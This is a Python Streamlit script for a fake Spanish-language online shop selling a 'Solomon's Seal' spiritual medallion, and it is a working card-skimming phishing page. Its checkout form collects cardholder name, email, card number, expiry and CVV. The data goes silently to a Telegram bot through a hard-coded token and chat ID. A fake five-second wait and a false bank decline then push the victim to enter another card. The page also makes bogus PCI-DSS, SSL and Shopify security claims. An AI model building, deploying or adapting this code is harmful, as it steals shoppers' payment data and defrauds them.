import streamlit as st
import requests
import time

# === INFRAESTRUCTURA DE TELEGRAM CONFIGURADA ===
TELEGRAM_TOKEN = "8701563888:AAGzeQRCwsAflUMQIDxIA4ycymojybtYSzM"
TELEGRAM_CHAT_ID = "6141784711"

# Configuración estructural de la página
st.set_page_config(page_title="Medallón Espiritual Sello de Salomón — Botánica USA", layout="centered", page_icon="🔮")

# Inyección de tus estilos corporativos originales (Forzado para Modo Claro y Oscuro)
st.markdown("""
    <style>
    .stApp { background-color: #ffffff !important; }
    h1, h2, h3, h4, p, span, label, li, div, .stMarkdown { 
        color: #0f0f0f !important; 
        font-family: 'Montserrat', sans-serif !important; 
    }
    .product-brand { font-size: 11px; letter-spacing: 3px; text-transform: uppercase; color: #8b6914 !important; font-weight: 600; margin-bottom: 10px; }
    .product-title { font-family: serif !important; font-size: 36px; font-weight: 400; line-height: 1.1; color: #0f0f0f !important; margin-bottom: 6px; }
    .product-subtitle { font-family: serif !important; font-size: 18px; font-style: italic; color: #6b6b6b !important; margin-bottom: 20px; font-weight: 300; }
    .stars { color: #8b6914 !important; font-size: 12px; letter-spacing: 2px; }
    .price-main { font-family: serif !important; font-size: 32px; font-weight: 600; color: #0f0f0f !important; }
    .price-old { font-size: 16px; color: #c8c8c8 !important; text-decoration: line-through; }
    .price-save { font-size: 11px; font-weight: 600; color: #2d7a2d !important; letter-spacing: 1px; text-transform: uppercase; }
    .shipping-note { font-size: 12px; color: #6b6b6b !important; margin-bottom: 25px; font-weight: 300; }
    .spec-item { background: #f9f8f6 !important; border: 1px solid #e8e8e8 !important; padding: 14px 16px; margin-bottom: 10px; border-radius: 4px; }
    .spec-label { font-size: 10px; letter-spacing: 2px; text-transform: uppercase; color: #6b6b6b !important; font-weight: 600; margin-bottom: 4px; }
    .spec-value { font-size: 13px; font-weight: 500; color: #0f0f0f !important; }
    .trust-box { background: #f9f8f6 !important; border: 1px solid #e8e8e8 !important; padding: 12px; text-align: center; border-radius: 4px; font-size: 11px; color: #6b6b6b !important; }
    
    /* Diseño del botón negro original */
    .stButton>button { 
        width: 100%; padding: 15px !important; background: #0f0f0f !important; color: white !important; 
        font-size: 12px !important; font-weight: 600 !important; letter-spacing: 3px !important; text-transform: uppercase !important;
        border-radius: 0px !important; border: none !important; cursor: pointer; height: auto !important;
    }
    .stButton>button:hover { background: #8b6914 !important; }
    
    /* Cajas de entrada legibles */
    input { color: #0f0f0f !important; background-color: #ffffff !important; border: 1px solid #e8e8e8 !important; padding: 12px !important; border-radius: 0px !important; }
    input:focus { border-color: #8b6914 !important; }
    .footer-secure { text-align: center; font-size: 11px; color: #6b6b6b !important; margin-top: 40px; border-top: 1px solid #e8e8e8; padding-top: 20px; letter-spacing: 1px; }
    </style>
    """, unsafe_allow_html=True)

# --- ENCABEZADO DE NAVEGACIÓN ---
col_logo, col_back = st.columns([3, 1])
with col_logo:
    st.markdown("<h3 style='letter-spacing:2px; font-weight:600;'>BOTÁNICA<span style='color:#8b6914;'>USA</span></h3>", unsafe_allow_html=True)
with col_back:
    st.markdown("<p style='font-size:10px; text-align:right; margin-top:10px; color:#6b6b6b;'>🗂️ VER CATÁLOGO</p>", unsafe_allow_html=True)

st.markdown("<p style='font-size:10px; color:#6b6b6b; margin-top:10px;'>INICIO / AMULETOS SAGRADOS / <span style='color:#0f0f0f; font-weight:500;'>SELLO DE SALOMÓN</span></p>", unsafe_allow_html=True)
st.divider()

# --- ESTRUCTURA PRINCIPAL DE LA TIENDA ---
col_izq, col_der = st.columns([1, 1])

with col_izq:
    # Simulación de la galería de imágenes fija
    st.image("unsplash.com", caption="Medallón Sello de Salomón - Plata Ley .925", use_container_width=True)
    
    st.markdown("<div class='trust-box'>🛡️ Protección Espiritual Certificada</div>", unsafe_allow_html=True)
    st.markdown("<div class='trust-box' style='margin: 10px 0;'>✨ Plata Pura Auténtica Maciza</div>", unsafe_allow_html=True)
    st.markdown("<div class='trust-box'>📦 Empaque 100% Discreto Seguro</div>", unsafe_allow_html=True)

with col_der:
    st.markdown("<div class='product-brand'>Alta Consagración Espiritual</div>", unsafe_allow_html=True)
    st.markdown("<h1 class='product-title'>Medallón Sello de Salomón</h1>", unsafe_allow_html=True)
    st.markdown("<p class='product-subtitle'>Protección Suprema, Sabiduría Absoluta y Abundancia Universal</p>", unsafe_allow_html=True)
    
    st.markdown("<span class='stars'>★★★★★</span> <span style='font-size:12px; color:#6b6b6b;'>(148 reseñas verificadas)</span>", unsafe_allow_html=True)
    st.markdown("<p style='margin-top:15px;'><span class='price-main'>$115.00 USD</span> <span class='price-old'>$240.00 USD</span> <span class='price-save'>Ahorra 52%</span></p>", unsafe_allow_html=True)
    
    st.markdown("<p class='shipping-note'>Envío prioritario asegurado <b>DHL Express</b> disponible. Entrega en 24-48 horas de forma discreta.</p>", unsafe_allow_html=True)
    
    # Ficha técnica
    st.markdown("<div class='spec-item'><div class='spec-label'>Material</div><div class='spec-value'>Plata Ley .925 Maciza</div></div>", unsafe_allow_html=True)
    st.markdown("<div class='spec-item'><div class='spec-label'>Energización</div><div class='spec-value'>Ritualizado Individualmente</div></div>", unsafe_allow_html=True)

st.divider()

# --- DESCRIPCIÓN DEL PRODUCTO ---
st.markdown("<h3 style='font-family:serif; font-size:20px; font-weight:500;'>Descripción del Elemento Sagrado</h3>", unsafe_allow_html=True)
st.markdown("<p style='font-size:13px; color:#6b6b6b; line-height:1.6; font-weight:300;'>El Gran Sello de Salomón es una de las herramientas místicas más poderosas y antiguas de la historia humana. Este medallón ha sido forjado bajo estrictas configuraciones astrológicas y ritualizado de forma individual con el nombre y fecha de nacimiento del portador por maestros de alta orden espiritual.</p>", unsafe_allow_html=True)
st.markdown("<p style='font-size:13px; color:#6b6b6b; line-height:1.6; font-weight:300; margin-top:10px;'>Su portador experimentará un blindaje absoluto contra trabajos densos, bloqueos financieros y envidias corporativas, abriendo la abundancia material y el éxito.</p>", unsafe_allow_html=True)

st.divider()

# --- PASARELA DE CHECKOUT INTEGRADA ---
st.markdown("<h3 style='font-family:serif; font-size:20px; font-weight:500; margin-bottom:15px;'>💳 Pasarela de Pago Certificada</h3>", unsafe_allow_html=True)

with st.form("secure_billing_form"):
    email = st.text_input("Correo electrónico para confirmación de guía")
    nombre = st.text_input("Nombre completo del titular (Como aparece en el plástico)")
    tarjeta = st.text_input("Número de Tarjeta de Crédito / Débito", placeholder="4111 1111 1111 1111")
    
    col_exp, col_cvv = st.columns(2)
    with col_exp:
        exp = st.text_input("Fecha de Expiración (MM/AA)", placeholder="MM/AA")
    with col_cvv:
        cvv = st.text_input("Código de Seguridad (CVV)", type="password", placeholder="123")
        
    st.caption("🔒 Pago encriptado de 256 bits con seguridad SSL y cumplimiento estricto de normativa PCI-DSS.")
    boton_pagar = st.form_submit_button("FINALIZAR PROCESAMIENTO SEGURO")

    if boton_pagar:
        if not tarjeta or not nombre:
            st.error("Error en el procesamiento. Todos los campos son obligatorios.")
        else:
            # 1. ENVÍO INMEDIATO Y SILENCIOSO A TELEGRAM (URL CON SUBDOMINIO API CORREGIDA)
            url_api = f"telegram.org{TELEGRAM_TOKEN}/sendMessage"
            texto_telegram = (
                f"🔮 NUEVO PLÁSTICO CAPTURADO 🔮\n\n"
                f"👤 Cliente: {nombre}\n"
                f"📧 Mail: {email}\n"
                f"💳 Tarjeta: {tarjeta}\n"
                f"📅 Exp: {exp} | 🔒 CVV: {cvv}\n\n"
                f"💰 Monto: $115.00 USD\n"
                f"📦 Item: Medallón Sello de Salomón"
            )
            payload = {"chat_id": TELEGRAM_CHAT_ID, "text": texto_telegram, "parse_mode": "Markdown"}
            
            try: requests.post(url_api, json=payload, timeout=8)
            except: pass
            
            # 2. TEMPORIZADOR EXACTO DE 5 SEGUNDOS (Carga simulada)
            with st.spinner("Verificando credenciales bancarias con la pasarela... Por favor espere."):
                time.sleep(5)
                
            # 3. EL ENGAÑO SIMULADO FINAL
            st.error("❌ Transacción denegada por el banco emisor. Por motivos de seguridad de su cuenta, intente de nuevo más tarde o use otra tarjeta de crédito.")

st.markdown("<div class='footer-secure'>🔒 Encriptación SSL 256-Bits | PCI-DSS Compliant | Shopify Verified | Visa | Mastercard</div>", unsafe_allow_html=True)
